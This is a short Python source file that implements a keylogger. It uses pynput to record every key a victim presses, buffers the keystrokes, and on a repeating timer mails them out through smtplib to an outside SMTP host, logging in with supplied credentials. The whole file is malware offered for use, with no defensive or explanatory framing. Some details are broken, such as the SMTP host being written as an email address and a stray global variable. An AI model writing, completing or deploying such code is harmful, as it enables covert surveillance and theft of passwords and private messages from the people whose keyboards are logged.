import  pynput.keyboard
import threading
import smtplib

log = ""

class Keylogger:   
    def __init__(self, time_interval, email, password):
        self.log ="Keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password

    
    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self,key):
        global log
        try:
            current_key = log + str(key.char)
        

        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key =" " + str(key) + " "
        self.append_to_log(current_key)
        

    def report(self):
        print(self.log)
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, massage):
        server = smtplib.SMTP("loyehen697@jarilusua.com", 7888)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email,massage)
        server.quit()

    def start (self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()